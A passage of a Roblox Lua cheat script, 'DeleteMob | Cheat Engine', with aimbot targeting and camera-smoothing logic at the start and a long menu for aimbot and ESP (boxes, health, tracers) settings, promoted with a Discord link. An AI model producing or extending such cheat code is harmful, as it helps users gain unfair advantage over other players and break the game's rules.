                        local screen_pos, on_screen = WorldToViewportPoint(CurrentCam, v.Character[DeleteMob.Aimbot.AimPart].Position)
                        local screen_pos_2D = Vector2.new(screen_pos.X, screen_pos.Y)
                        local new_magnitude = (screen_pos_2D - mouseLocation(UIS)).Magnitude
                        if on_screen and new_magnitude < AimFov and isVisible(v.Character[DeleteMob.Aimbot.AimPart].Position, v.Character.Head.Parent) then
                            AimFov = new_magnitude
                            targetPos = v-- Made By Mick Gordon
                        end
                    end-- Made By Mick Gordon
                else
                    if v.Character and v.Character:FindFirstChild(DeleteMob.Aimbot.AimPart) and v.Character.Humanoid and v.Character.Humanoid.Health > 0 then
                        local screen_pos, on_screen = WorldToViewportPoint(CurrentCam, v.Character[DeleteMob.Aimbot.AimPart].Position)
                        local screen_pos_2D = Vector2.new(screen_pos.X, screen_pos.Y)
                        local new_magnitude = (screen_pos_2D - mouseLocation(UIS)).Magnitude
                        if on_screen and new_magnitude < AimFov and isVisible(v.Character[DeleteMob.Aimbot.AimPart].Position, v.Character.Head.Parent) then
                            AimFov = new_magnitude
                            targetPos = v
                        end
                    end
                end
            end
        end
        return targetPos
    end
    
    
    local function aimAt(pos, smooth)
        local AimPart = pos.Character:FindFirstChild(DeleteMob.Aimbot.AimPart)
        if AimPart then
            local LookAt = nil
            local Distance = math.floor(0.5+(PLAYER.Character:FindFirstChild"HumanoidRootPart".Position - pos.Character:FindFirstChild"HumanoidRootPart".Position).magnitude)
            if Distance > 100  then
                local distChangeBig = Distance / 10
                LookAt = CurrentCam.CFrame:PointToWorldSpace(Vector3.new(0,0,-smooth * distChangeBig)):Lerp(AimPart.Position,.01) -- No one esle do camera smoothing ? tf
            else-- Made By Mick Gordon
                local distChangeSmall = Distance / 10
                LookAt = CurrentCam.CFrame:PointToWorldSpace(Vector3.new(0,0,-smooth * distChangeSmall)):Lerp(AimPart.Position,.01) -- No one esle do camera smoothing ? tf
            end
            CurrentCam.CFrame = CFrame.lookAt(CurrentCam.CFrame.Position, LookAt)
        end
    end
    
    -- Cant Be Botherd To Clean This Up
    local CheatEngineDeleteMob = Instance.new("ScreenGui")
    local DeleteMobF = Instance.new("Frame")
    local TextBox = Instance.new("TextBox")
    local Name = Instance.new("TextLabel")
    local Line = Instance.new("Frame")
    local Line_2 = Instance.new("Frame")
    local AimBotSection = Instance.new("Frame")
    local UIListLayout = Instance.new("UIListLayout")
    local ABE = Instance.new("TextButton")
    local ABWC = Instance.new("TextButton")
    local ABTC = Instance.new("TextButton")
    local ABSF = Instance.new("TextButton")
    local Frame = Instance.new("Frame")
    local Slider3 = Instance.new("Frame")-- Made By Mick Gordon
    local UICorner = Instance.new("UICorner")
    local Fill1 = Instance.new("Frame")
    local UICorner_2 = Instance.new("UICorner")
    local UIGradient = Instance.new("UIGradient")
    local TriggerFov = Instance.new("TextButton")
    local Numbers = Instance.new("TextLabel")
    local TextLabel = Instance.new("TextLabel")
    local Frame_2 = Instance.new("Frame")
    local Slider4 = Instance.new("Frame")
    local UICorner_3 = Instance.new("UICorner")
    local Fill2 = Instance.new("Frame")
    local UICorner_4 = Instance.new("UICorner")
    local UIGradient_2 = Instance.new("UIGradient")
    local TriggerSmoothing = Instance.new("TextButton")-- Made By Mick Gordon
    local Numbers_2 = Instance.new("TextLabel")
    local TextLabel_2 = Instance.new("TextLabel")
    local TextLabel_3 = Instance.new("TextLabel")
    local Allways_Show = Instance.new("TextButton")
    local TextLabel_4 = Instance.new("TextLabel")
    local ESPSection = Instance.new("Frame")
    local UIListLayout_2 = Instance.new("UIListLayout")
    local BBE = Instance.new("TextButton")
    local BTC = Instance.new("TextButton")
    local BBN = Instance.new("TextButton")
    local BBD = Instance.new("TextButton")
    local BBH = Instance.new("TextButton")
    local TextLabel_5 = Instance.new("TextLabel")
    local BBHT = Instance.new("TextButton")
    local TextLabel_6 = Instance.new("TextLabel")
    local TextLabel_7 = Instance.new("TextLabel")
    local Frame_3 = Instance.new("Frame")
    local UIListLayout_3 = Instance.new("UIListLayout")
    local Box_R = Instance.new("TextBox")
    local Box_G = Instance.new("TextBox")
    local Box_B = Instance.new("TextBox")
    local TextLabel_8 = Instance.new("TextLabel")
    local ESPSection_2 = Instance.new("Frame")
    local UIListLayout_4 = Instance.new("UIListLayout")
    local OE = Instance.new("TextButton")
    local OTC = Instance.new("TextButton")-- Made By Mick Gordon
    local Frame_4 = Instance.new("Frame")
    local Slider1 = Instance.new("Frame")
    local UICorner_5 = Instance.new("UICorner")
    local Fill3 = Instance.new("Frame")
    local UICorner_6 = Instance.new("UICorner")
    local UIGradient_3 = Instance.new("UIGradient")
    local TriggerOutTans = Instance.new("TextButton")
    local Numbers_3 = Instance.new("TextLabel")
    local TextLabel_9 = Instance.new("TextLabel")
    local Frame_5 = Instance.new("Frame")
    local Slider2 = Instance.new("Frame")
    local UICorner_7 = Instance.new("UICorner")
    local Fill4 = Instance.new("Frame")
    local UICorner_8 = Instance.new("UICorner")
    local UIGradient_4 = Instance.new("UIGradient")
    local TriggerFill = Instance.new("TextButton")
    local Numbers_4 = Instance.new("TextLabel")
    local TextLabel_10 = Instance.new("TextLabel")
    local TextLabel_11 = Instance.new("TextLabel")
    local Frame_6 = Instance.new("Frame")
    local UIListLayout_5 = Instance.new("UIListLayout")
    local Outlines_R = Instance.new("TextBox")
    local Outlines_G = Instance.new("TextBox")
    local Outlines_B = Instance.new("TextBox")
    local TextLabel_12 = Instance.new("TextLabel")
    local Frame_7 = Instance.new("Frame")
    local UIListLayout_6 = Instance.new("UIListLayout")
    local FillOutlines_R = Instance.new("TextBox")
    local FillOutlines_G = Instance.new("TextBox")
    local FillOutlines_B = Instance.new("TextBox")
    local Tracerssection = Instance.new("Frame")
    local UIListLayout_7 = Instance.new("UIListLayout")
    local TE = Instance.new("TextButton")
    local TTC = Instance.new("TextButton")
    local TTCOlor = Instance.new("TextButton")
    local Frame_8 = Instance.new("Frame")
    local UIListLayout_8 = Instance.new("UIListLayout")
    local Tracers_R = Instance.new("TextBox")
    local Tracers_G = Instance.new("TextBox")
    local Tracers_B = Instance.new("TextBox")-- Made By Mick Gordon
    local Unknown = Instance.new("Frame")
    local UIListLayout_9 = Instance.new("UIListLayout")
    local TextLabel_13 = Instance.new("TextLabel")
    local TextLabel_14 = Instance.new("TextLabel")
    local Open = Instance.new("Frame")
    local TextButton = Instance.new("TextButton")
    
    --Properties:
    
    CheatEngineDeleteMob.Name = "CheatEngineDeleteMob"
    CheatEngineDeleteMob.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
    CheatEngineDeleteMob.Enabled = true
    CheatEngineDeleteMob.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    CheatEngineDeleteMob.DisplayOrder = 10
    CheatEngineDeleteMob.ResetOnSpawn = false
    -- Made By Mick Gordon
    DeleteMobF.Name = "DeleteMobF"
    DeleteMobF.Parent = CheatEngineDeleteMob
    DeleteMobF.BackgroundColor3 = Color3.fromRGB(52, 52, 52)
    DeleteMobF.BorderColor3 = Color3.fromRGB(255, 255, 255)
    DeleteMobF.Position = UDim2.new(0.144998878, 0, 0.328040659, 0)
    DeleteMobF.Size = UDim2.new(0, 1213, 0, 398)
    DeleteMobF.ZIndex = 10
    DeleteMobF.Draggable = true
    DeleteMobF.Active = true
    
    TextBox.Parent = DeleteMobF
    TextBox.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    TextBox.BackgroundTransparency = 1.000
    TextBox.BorderColor3 = Color3.fromRGB(0, 0, 0)
    TextBox.BorderSizePixel = 0
    TextBox.Position = UDim2.new(0.791149139, 0, 0.0127403988, 0)
    TextBox.Size = UDim2.new(0, 200, 0, 23)
    TextBox.ClearTextOnFocus = false
    TextBox.Font = Enum.Font.Roboto
    TextBox.PlaceholderText = "https://discord.gg/FsApQ7YNTq"
    TextBox.Text = "https://discord.gg/FsApQ7YNTq - Double Click Me"
    TextBox.TextColor3 = Color3.fromRGB(255, 255, 255)
    TextBox.TextSize = 14.000
    
    Name.Name = "Name"
    Name.Parent = DeleteMobF
    Name.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    Name.BackgroundTransparency = 1.000
    Name.BorderColor3 = Color3.fromRGB(0, 0, 0)
    Name.BorderSizePixel = 0
    Name.Position = UDim2.new(0.0178597774, 0, 0.00456260797, 0)
    Name.Size = UDim2.new(0, 200, 0, 31)
    Name.Font = Enum.Font.Gotham
    Name.Text = "DeleteMob | Cheat Engine"
    Name.TextColor3 = Color3.fromRGB(17, 223, 255)
    Name.TextSize = 19.000
    
    Line.Name = "Line"
    Line.Parent = DeleteMobF
    Line.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    Line.BorderColor3 = Color3.fromRGB(0, 0, 0)
    Line.BorderSizePixel = 0
    Line.Position = UDim2.new(0, 0, 0.0804020092, 0)
    Line.Size = UDim2.new(0, 1213, 0, 1)
    
    Line_2.Name = "Line"
    Line_2.Parent = DeleteMobF
    Line_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    Line_2.BorderColor3 = Color3.fromRGB(0, 0, 0)
    Line_2.BorderSizePixel = 0
    Line_2.Position = UDim2.new(0.205276027, 0, 0.0828348249, 0)
    Line_2.Size = UDim2.new(0, 1, 0, 365)
    -- Made By Mick Gordon
    AimBotSection.Name = "AimBotSection"
    AimBotSection.Parent = DeleteMobF
    AimBotSection.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    AimBotSection.BackgroundTransparency = 1.000
    AimBotSection.BorderColor3 = Color3.fromRGB(0, 0, 0)
    AimBotSection.BorderSizePixel = 0
    AimBotSection.Position = UDim2.new(0.0604648069, 0, 0.160724282, 0)
    AimBotSection.Size = UDim2.new(0, 100, 0, 334)
    
    UIListLayout.Parent = AimBotSection
    UIListLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
    UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder
    UIListLayout.Padding = UDim.new(0, 5)
    
    ABE.Name = "ABE"
    ABE.Parent = AimBotSection
    ABE.BackgroundColor3 = Color3.fromRGB(52, 52, 52)
    ABE.BorderColor3 = Color3.fromRGB(255, 255, 255)
    ABE.Position = UDim2.new(0.234439835, 0, 0.139479905, 0)
    ABE.Size = UDim2.new(0, 164, 0, 29)
    ABE.Font = Enum.Font.Gotham
    ABE.Text = "Enable"
    ABE.TextColor3 = Color3.fromRGB(255, 255, 255)
    ABE.TextSize = 16.000
    
    ABWC.Name = "ABWC"
    ABWC.Parent = AimBotSection
    ABWC.BackgroundColor3 = Color3.fromRGB(52, 52, 52)
    ABWC.BorderColor3 = Color3.fromRGB(255, 255, 255)
    ABWC.Position = UDim2.new(0.234439835, 0, 0.139479905, 0)
    ABWC.Size = UDim2.new(0, 164, 0, 29)
    ABWC.Font = Enum.Font.Gotham
    ABWC.Text = "Wall Check"
    ABWC.TextColor3 = Color3.fromRGB(255, 255, 255)
    ABWC.TextSize = 16.000
    
    ABTC.Name = "ABTC"
    ABTC.Parent = AimBotSection
    ABTC.BackgroundColor3 = Color3.fromRGB(52, 52, 52)
    ABTC.BorderColor3 = Color3.fromRGB(255, 255, 255)
    ABTC.Position = UDim2.new(0.234439835, 0, 0.139479905, 0)
    ABTC.Size = UDim2.new(0, 164, 0, 29)
    ABTC.Font = Enum.Font.Gotham
    ABTC.Text = "Team Check"
    ABTC.TextColor3 = Color3.fromRGB(255, 255, 255)
    ABTC.TextSize = 16.000
    
    ABSF.Name = "ABSF"
    ABSF.Parent = AimBotSection
    ABSF.BackgroundColor3 = Color3.fromRGB(52, 52, 52)
    ABSF.BorderColor3 = Color3.fromRGB(255, 255, 255)
    ABSF.Position = UDim2.new(0.234439835, 0, 0.139479905, 0)
    ABSF.Size = UDim2.new(0, 164, 0, 29)
    ABSF.Font = Enum.Font.Gotham
    ABSF.Text = "Show Fov"
    ABSF.TextColor3 = Color3.fromRGB(255, 255, 255)
    ABSF.TextSize = 16.000
    
    Frame.Parent = AimBotSection
    Frame.BackgroundColor3 = Color3.fromRGB(52, 52, 52)
    Frame.BackgroundTransparency = 0.700
    Frame.BorderColor3 = Color3.fromRGB(0, 0, 0)
    Frame.BorderSizePixel = 0
    Frame.Position = UDim2.new(-0.550000012, 0, 0.739130437, 0)
    Frame.Size = UDim2.new(0, 230, 0, 50)
    
    Slider3.Name = "Slider3"
    Slider3.Parent = Frame
    Slider3.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    Slider3.BorderColor3 = Color3.fromRGB(0, 0, 0)
    Slider3.BorderSizePixel = 0
    Slider3.Position = UDim2.new(0.0629399866, 0, 0.45120728, 0)
    Slider3.Size = UDim2.new(0, 200, 0, 15)
    
    UICorner.Parent = Slider3
    
    Fill1.Name = "Fill1"
    Fill1.Parent = Slider3
    Fill1.BackgroundColor3 = Color3.fromRGB(80, 80, 80)
    Fill1.BackgroundTransparency = 0.200
    Fill1.BorderColor3 = Color3.fromRGB(0, 0, 0)
    Fill1.BorderSizePixel = 0
    Fill1.Size = UDim2.new(0, 100, 0, 15)
    
    UICorner_2.Parent = Fill1
    
    UIGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(17, 223, 255)), ColorSequenceKeypoint.new(0.29, Color3.fromRGB(17, 223, 255)), ColorSequenceKeypoint.new(0.43, Color3.fromRGB(18, 218, 249)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(52, 52, 52))}
    UIGradient.Parent = Fill1
    -- Made By Mick Gordon
    TriggerFov.Name = "TriggerFov"
    TriggerFov.Parent = Slider3
    TriggerFov.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    TriggerFov.BackgroundTransparency = 1.000
    TriggerFov.BorderColor3 = Color3.fromRGB(0, 0, 0)
    TriggerFov.BorderSizePixel = 0
    TriggerFov.Size = UDim2.new(1, 0, 1, 0)
    TriggerFov.Font = Enum.Font.SourceSans
    TriggerFov.Text = ""
    TriggerFov.TextColor3 = Color3.fromRGB(0, 0, 0)
    TriggerFov.TextSize = 14.000
    
    Numbers.Name = "Numbers"
    Numbers.Parent = Frame
    Numbers.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    Numbers.BackgroundTransparency = 1.000
    Numbers.BorderColor3 = Color3.fromRGB(255, 255, 255)
    Numbers.BorderSizePixel = 0
    Numbers.Position = UDim2.new(0.79130435, 0, 0, 0)
    Numbers.Size = UDim2.new(0, 50, 0, 23)
    Numbers.Font = Enum.Font.Gotham
    Numbers.Text = "350"
    Numbers.TextColor3 = Color3.fromRGB(255, 255, 255)
    Numbers.TextSize = 14.000
    
    TextLabel.Parent = Frame
    TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    TextLabel.BackgroundTransparency = 1.000
    TextLabel.BorderColor3 = Color3.fromRGB(255, 255, 255)
    TextLabel.BorderSizePixel = 0
    TextLabel.Position = UDim2.new(0.0608695634, 0, 0, 0)
    TextLabel.Size = UDim2.new(0, 50, 0, 23)
    TextLabel.Font = Enum.Font.Gotham
    TextLabel.Text = "Fov"
    TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
    TextLabel.TextSize = 14.000
    
    Frame_2.Parent = AimBotSection
    Frame_2.BackgroundColor3 = Color3.fromRGB(52, 52, 52)
    Frame_2.BackgroundTransparency = 0.700
    Frame_2.BorderColor3 = Color3.fromRGB(0, 0, 0)
    Frame_2.BorderSizePixel = 0
    Frame_2.Position = UDim2.new(-0.550000012, 0, 0.739130437, 0)
    Frame_2.Size = UDim2.new(0, 230, 0, 50)
    
    Slider4.Name = "Slider4"
    Slider4.Parent = Frame_2
    Slider4.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    Slider4.BorderColor3 = Color3.fromRGB(0, 0, 0)
    Slider4.BorderSizePixel = 0
    Slider4.Position = UDim2.new(0.0629399866, 0, 0.45120728, 0)
    Slider4.Size = UDim2.new(0, 200, 0, 15)
    
    UICorner_3.Parent = Slider4
    
    Fill2.Name = "Fill2"
    Fill2.Parent = Slider4
    Fill2.BackgroundColor3 = Color3.fromRGB(80, 80, 80)
    Fill2.BackgroundTransparency = 0.200
    Fill2.BorderColor3 = Color3.fromRGB(0, 0, 0)
    Fill2.BorderSizePixel = 0
    Fill2.Size = UDim2.new(0, 0, 0, 15)
    
    UICorner_4.Parent = Fill2
    
    UIGradient_2.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(17, 223, 255)), ColorSequenceKeypoint.new(0.29, Color3.fromRGB(17, 223, 255)), ColorSequenceKeypoint.new(0.43, Color3.fromRGB(18, 218, 249)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(52, 52, 52))}-- Made By Mick Gordon
    UIGradient_2.Parent = Fill2
    
    TriggerSmoothing.Name = "TriggerSmoothing"
    TriggerSmoothing.Parent = Slider4
    TriggerSmoothing.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    TriggerSmoothing.BackgroundTransparency = 1.000
    TriggerSmoothing.BorderColor3 = Color3.fromRGB(0, 0, 0)
    TriggerSmoothing.BorderSizePixel = 0
    TriggerSmoothing.Size = UDim2.new(1, 0, 1, 0)
    TriggerSmoothing.Font = Enum.Font.SourceSans
    TriggerSmoothing.Text = ""
    TriggerSmoothing.TextColor3 = Color3.fromRGB(0, 0, 0)
    TriggerSmoothing.TextSize = 14.000
    -- Made By Mick Gordon
    Numbers_2.Name = "Numbers"
    Numbers_2.Parent = Frame_2
    Numbers_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    Numbers_2.BackgroundTransparency = 1.000
    Numbers_2.BorderColor3 = Color3.fromRGB(255, 255, 255)
    Numbers_2.BorderSizePixel = 0
    Numbers_2.Position = UDim2.new(0.79130435, 0, 0, 0)
    Numbers_2.Size = UDim2.new(0, 50, 0, 23)
    Numbers_2.Font = Enum.Font.Gotham
    Numbers_2.Text = "0"
    Numbers_2.TextColor3 = Color3.fromRGB(255, 255, 255)
    Numbers_2.TextSize = 14.000
    
    TextLabel_2.Parent = Frame_2
    TextLabel_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    TextLabel_2.BackgroundTransparency = 1.000
    TextLabel_2.BorderColor3 = Color3.fromRGB(255, 255, 255)
    TextLabel_2.BorderSizePixel = 0
    TextLabel_2.Position = UDim2.new(0.0608695634, 0, 0, 0)
    TextLabel_2.Size = UDim2.new(0, 50, 0, 23)
    TextLabel_2.Font = Enum.Font.Gotham
    TextLabel_2.Text = "Smoothing"
    TextLabel_2.TextColor3 = Color3.fromRGB(255, 255, 255)
    TextLabel_2.TextSize = 14.000
    
    TextLabel_3.Parent = AimBotSection
    TextLabel_3.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    TextLabel_3.BackgroundTransparency = 1.000
    TextLabel_3.BorderColor3 = Color3.fromRGB(0, 0, 0)
    TextLabel_3.BorderSizePixel = 0
    TextLabel_3.Position = UDim2.new(0.0700000003, 0, 0.20869565, 0)
    TextLabel_3.Size = UDim2.new(0, 100, 0, 17)
    TextLabel_3.Font = Enum.Font.Gotham
    TextLabel_3.Text = "Aim Part"
    TextLabel_3.TextColor3 = Color3.fromRGB(17, 223, 255)
    TextLabel_3.TextSize = 21.000
    
    Allways_Show.Name = "Allways_Show"
    Allways_Show.Parent = AimBotSection
    Allways_Show.BackgroundColor3 = Color3.fromRGB(52, 52, 52)
    Allways_Show.BorderColor3 = Color3.fromRGB(255, 255, 255)
    Allways_Show.Position = UDim2.new(0.234439835, 0, 0.139479905, 0)
    Allways_Show.Size = UDim2.new(0, 164, 0, 29)
    Allways_Show.Font = Enum.Font.Gotham
    Allways_Show.Text = "HEAD, torso"
    Allways_Show.TextColor3 = Color3.fromRGB(255, 255, 255)
    Allways_Show.TextSize = 16.000
    
    TextLabel_4.Parent = DeleteMobF
    TextLabel_4.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    TextLabel_4.BackgroundTransparency = 1.000
    TextLabel_4.BorderColor3 = Color3.fromRGB(0, 0, 0)
    TextLabel_4.BorderSizePixel = 0
    TextLabel_4.Position = UDim2.new(0.00569662312, 0, 0.100655407, 0)
    TextLabel_4.Size = UDim2.new(0, 100, 0, 17)
    TextLabel_4.Font = Enum.Font.Gotham
    TextLabel_4.Text = "Aim Bot"
    TextLabel_4.TextColor3 = Color3.fromRGB(17, 223, 255)
    TextLabel_4.TextSize = 18.000
    TextLabel_4.TextXAlignment = Enum.TextXAlignment.Left
    
    ESPSection.Name = "ESPSection"
    ESPSection.Parent = DeleteMobF
    ESPSection.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    ESPSection.BackgroundTransparency = 1.000
    ESPSection.BorderColor3 = Color3.fromRGB(0, 0, 0)
    ESPSection.BorderSizePixel = 0
    ESPSection.Position = UDim2.new(0.26986298, 0, 0.160724282, 0)
    ESPSection.Size = UDim2.new(0, 100, 0, 334)
    -- Made By Mick Gordon
    UIListLayout_2.Parent = ESPSection
    UIListLayout_2.HorizontalAlignment = Enum.HorizontalAlignment.Center
    UIListLayout_2.SortOrder = Enum.SortOrder.LayoutOrder
    UIListLayout_2.Padding = UDim.new(0, 5)
    
    BBE.Name = "BBE"
    BBE.Parent = ESPSection
    BBE.BackgroundColor3 = Color3.fromRGB(52, 52, 52)
    BBE.BorderColor3 = Color3.fromRGB(255, 255, 255)
    BBE.Position = UDim2.new(0.234439835, 0, 0.139479905, 0)
    BBE.Size = UDim2.new(0, 164, 0, 29)
    BBE.Font = Enum.Font.Gotham
    BBE.Text = "Box"
    BBE.TextColor3 = Color3.fromRGB(255, 255, 255)
    BBE.TextSize = 16.000
    
    BBN.Name = "BBN"
    BBN.Parent = ESPSection
    BBN.BackgroundColor3 = Color3.fromRGB(52, 52, 52)
    BBN.BorderColor3 = Color3.fromRGB(255, 255, 255)
    BBN.Position = UDim2.new(0.234439835, 0, 0.139479905, 0)
    BBN.Size = UDim2.new(0, 164, 0, 29)
    BBN.Font = Enum.Font.Gotham
    BBN.Text = "Name"
    BBN.TextColor3 = Color3.fromRGB(255, 255, 255)
    BBN.TextSize = 16.000
    -- Made By Mick Gordon
    BBD.Name = "BBD"
    BBD.Parent = ESPSection
    BBD.BackgroundColor3 = Color3.fromRGB(52, 52, 52)
    BBD.BorderColor3 = Color3.fromRGB(255, 255, 255)
    BBD.Position = UDim2.new(0.234439835, 0, 0.139479905, 0)
    BBD.Size = UDim2.new(0, 164, 0, 29)
    BBD.Font = Enum.Font.Gotham
    BBD.Text = "Distance"
    BBD.TextColor3 = Color3.fromRGB(255, 255, 255)
    BBD.TextSize = 16.000
    
    BBH.Name = "BBH"
    BBH.Parent = ESPSection
    BBH.BackgroundColor3 = Color3.fromRGB(52, 52, 52)
    BBH.BorderColor3 = Color3.fromRGB(255, 255, 255)
    BBH.Position = UDim2.new(0.234439835, 0, 0.139479905, 0)
    BBH.Size = UDim2.new(0, 164, 0, 29)
    BBH.Font = Enum.Font.Gotham
    BBH.Text = "Health"
    BBH.TextColor3 = Color3.fromRGB(255, 255, 255)
    BBH.TextSize = 16.000
    
    BTC.Name = "BBE"
    BTC.Parent = ESPSection
    BTC.BackgroundColor3 = Color3.fromRGB(52, 52, 52)
    BTC.BorderColor3 = Color3.fromRGB(255, 255, 255)
    BTC.Position = UDim2.new(0.234439835, 0, 0.139479905, 0)
    BTC.Size = UDim2.new(0, 164, 0, 29)
    BTC.Font = Enum.Font.Gotham
    BTC.Text = "Team Check"
    BTC.TextColor3 = Color3.fromRGB(255, 255, 255)
    BTC.TextSize = 16.000
    
    TextLabel_5.Parent = ESPSection
    TextLabel_5.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    TextLabel_5.BackgroundTransparency = 1.000
    TextLabel_5.BorderColor3 = Color3.fromRGB(0, 0, 0)
    TextLabel_5.BorderSizePixel = 0
    TextLabel_5.Position = UDim2.new(0.0700000003, 0, 0.20869565, 0)
    TextLabel_5.Size = UDim2.new(0, 100, 0, 17)
    TextLabel_5.Font = Enum.Font.Gotham
    TextLabel_5.Text = "Health Type"
    TextLabel_5.TextColor3 = Color3.fromRGB(17, 223, 255)
    TextLabel_5.TextSize = 21.000
    -- Made By Mick Gordon
    BBHT.Name = "BBHT"
    BBHT.Parent = ESPSection
    BBHT.BackgroundColor3 = Color3.fromRGB(52, 52, 52)
    BBHT.BorderColor3 = Color3.fromRGB(255, 255, 255)
    BBHT.Position = UDim2.new(0.234439835, 0, 0.139479905, 0)
    BBHT.Size = UDim2.new(0, 164, 0, 29)
    BBHT.Font = Enum.Font.Gotham
    BBHT.Text = "BAR, text, both"
    BBHT.TextColor3 = Color3.fromRGB(255, 255, 255)
    BBHT.TextSize = 16.000
    
    TextLabel_6.Parent = ESPSection
    TextLabel_6.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    TextLabel_6.BackgroundTransparency = 1.000
    TextLabel_6.BorderColor3 = Color3.fromRGB(0, 0, 0)
    TextLabel_6.BorderSizePixel = 0-- Made By Mick Gordon
    TextLabel_6.Position = UDim2.new(0.0700000003, 0, 0.20869565, 0)
    TextLabel_6.Size = UDim2.new(0, 100, 0, 17)
    TextLabel_6.Font = Enum.Font.Gotham
    TextLabel_6.Text = "Box Color"
    TextLabel_6.TextColor3 = Color3.fromRGB(17, 223, 255)
    TextLabel_6.TextSize = 21.000
    
    TextLabel_7.Parent = ESPSection
    TextLabel_7.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    TextLabel_7.BackgroundTransparency = 1.000
    TextLabel_7.BorderColor3 = Color3.fromRGB(0, 0, 0)
    TextLabel_7.BorderSizePixel = 0
    TextLabel_7.Position = UDim2.new(0.0700000003, 0, 0.20869565, 0)
    TextLabel_7.Size = UDim2.new(0, 100, 0, 17)
    TextLabel_7.Font = Enum.Font.Gotham
    TextLabel_7.Text = "R,G,B"
    TextLabel_7.TextColor3 = Color3.fromRGB(17, 223, 255)
    TextLabel_7.TextSize = 21.000
    
    Frame_3.Parent = ESPSection
    Frame_3.BackgroundColor3 = Color3.fromRGB(52, 52, 52)
    Frame_3.BorderColor3 = Color3.fromRGB(0, 0, 0)
    Frame_3.BorderSizePixel = 0
    Frame_3.Position = UDim2.new(0.0909090936, 0, 0.600000739, 0)
    Frame_3.Size = UDim2.new(0, 100, 0, 30)
    
    UIListLayout_3.Parent = Frame_3
    UIListLayout_3.FillDirection = Enum.FillDirection.Horizontal
    UIListLayout_3.HorizontalAlignment = Enum.HorizontalAlignment.Center
    UIListLayout_3.SortOrder = Enum.SortOrder.LayoutOrder
    UIListLayout_3.VerticalAlignment = Enum.VerticalAlignment.Center
    UIListLayout_3.Padding = UDim.new(0, 5)
    
    Box_R.Name = "Box_R"
    Box_R.Parent = Frame_3
    Box_R.BackgroundColor3 = Color3.fromRGB(52, 52, 52)
    Box_R.BorderColor3 = Color3.fromRGB(255, 255, 255)
    Box_R.Size = UDim2.new(0, 75, 0, 24)
    Box_R.ClearTextOnFocus = false
    Box_R.Font = Enum.Font.Gotham
    Box_R.PlaceholderText = "255 - 0"
    Box_R.Text = "75"
    Box_R.TextColor3 = Color3.fromRGB(255, 255, 255)
    Box_R.TextSize = 14.000
    
    Box_G.Name = "Box_G"
    Box_G.Parent = Frame_3
    Box_G.BackgroundColor3 = Color3.fromRGB(52, 52, 52)
    Box_G.BorderColor3 = Color3.fromRGB(255, 255, 255)
    Box_G.Size = UDim2.new(0, 75, 0, 24)
    Box_G.ClearTextOnFocus = false
    Box_G.Font = Enum.Font.Gotham
    Box_G.PlaceholderText = "255 - 0"
    Box_G.Text = "0" 
    Box_G.TextColor3 = Color3.fromRGB(255, 255, 255)
    Box_G.TextSize = 14.000
    -- Made By Mick Gordon
    Box_B.Name = "Box_B"
    Box_B.Parent = Frame_3
    Box_B.BackgroundColor3 = Color3.fromRGB(52, 52, 52)
    Box_B.BorderColor3 = Color3.fromRGB(255, 255, 255)
    Box_B.Size = UDim2.new(0, 75, 0, 24)
    Box_B.ClearTextOnFocus = false
    Box_B.Font = Enum.Font.Gotham
    Box_B.PlaceholderText = "255 - 0"
    Box_B.Text = "10"
    Box_B.TextColor3 = Color3.fromRGB(255, 255, 255)
    Box_B.TextSize = 14.000
    
    TextLabel_8.Parent = DeleteMobF
    TextLabel_8.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    TextLabel_8.BackgroundTransparency = 1.000
    TextLabel_8.BorderColor3 = Color3.fromRGB(0, 0, 0)
    TextLabel_8.BorderSizePixel = 0
    TextLabel_8.Position = UDim2.new(0.215919182, 0, 0.100655407, 0)
    TextLabel_8.Size = UDim2.new(0, 100, 0, 17)
    TextLabel_8.Font = Enum.Font.Gotham
    TextLabel_8.Text = "ESP"
    TextLabel_8.TextColor3 = Color3.fromRGB(17, 223, 255)
    TextLabel_8.TextSize = 18.000
    TextLabel_8.TextXAlignment = Enum.TextXAlignment.Left
    
    ESPSection_2.Name = "ESPSection"
    ESPSection_2.Parent = DeleteMobF
    ESPSection_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    ESPSection_2.BackgroundTransparency = 1.000
    ESPSection_2.BorderColor3 = Color3.fromRGB(0, 0, 0)
    ESPSection_2.BorderSizePixel = 0
    ESPSection_2.Position = UDim2.new(0.475963563, 0, 0.160724282, 0)
    ESPSection_2.Size = UDim2.new(0, 100, 0, 334)
    
    UIListLayout_4.Parent = ESPSection_2
    UIListLayout_4.HorizontalAlignment = Enum.HorizontalAlignment.Center
    UIListLayout_4.SortOrder = Enum.SortOrder.LayoutOrder
    UIListLayout_4.Padding = UDim.new(0, 5)
    
    OE.Name = "OE"
    OE.Parent = ESPSection_2
    OE.BackgroundColor3 = Color3.fromRGB(52, 52, 52)
    OE.BorderColor3 = Color3.fromRGB(255, 255, 255)
    OE.Position = UDim2.new(0.234439835, 0, 0.139479905, 0)
